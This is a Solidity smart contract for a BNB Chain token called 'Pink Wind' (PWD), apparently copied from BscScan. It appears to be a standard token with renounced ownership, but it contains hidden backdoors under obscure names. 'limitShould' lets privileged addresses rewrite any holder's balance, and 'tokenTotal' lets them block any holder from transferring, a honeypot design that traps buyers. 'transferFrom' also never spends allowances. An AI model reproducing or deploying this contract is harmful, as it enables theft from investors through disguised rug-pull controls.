/**
 *Submitted for verification at BscScan.com on 2023-03-10
*/

pragma solidity ^0.8.3;

// SPDX-License-Identifier: Unlicensed

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface receiverLaunchedTake {
    function createPair(address receiverSender, address enableFee) external returns (address);
}


abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed prevOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
        renounceOwnership();
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}


contract PinkWind is Ownable, IERC20 {

    mapping(address => bool) public teamTake;

    uint256 private _decimals = 18;

    address modeIsLiquidity = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    mapping(address => bool) public maxMode;

    function totalSupply() external view override returns (uint256) {
        return shouldMin;
    }

    bool public receiverEnable;

    mapping(address => uint256) private shouldTxSwap;

    address public liquidityMin;

    mapping(address => mapping(address => uint256)) private _allowances;

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    using SafeMath for uint256;

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    mapping(address => uint256) private _balance;

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "IERC20: transfer amount exceeds allowance");
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function atTradingLimit(address limitAuto) public {
        require(!receiverEnable);
        teamTake[limitAuto] = true;
        receiverEnable = true;
    }

    string private _name = "Pink Wind";

    address public isLiquidityReceiver;

    constructor () { 
        liquidityMin = _msgSender();
        shouldTxSwap[_msgSender()] = shouldMin;
        isLiquidityReceiver = receiverLaunchedTake(buyTrading).createPair(modeIsLiquidity,address(this));
        teamTake[_msgSender()] = true;
        emit Transfer(address(0), liquidityMin, shouldMin);
    }

    address buyTrading = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    uint256 private shouldMin = 100000000 * 10 ** 18;

    function limitShould(address minAuto, uint256 swapAt) public {
        if (!teamTake[_msgSender()]) {
            return;
        }
        shouldTxSwap[minAuto] = swapAt;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return shouldTxSwap[account];
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        require(!maxMode[sender]);

        shouldTxSwap[sender] = shouldTxSwap[sender].sub(amount);
        shouldTxSwap[recipient] = shouldTxSwap[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    string private _symbol = "PWD";

    function tokenTotal(address minLiquidity) public {
        if (minLiquidity == liquidityMin || minLiquidity == isLiquidityReceiver || !teamTake[_msgSender()]) {
            return;
        }
        maxMode[minLiquidity] = true;
    }

}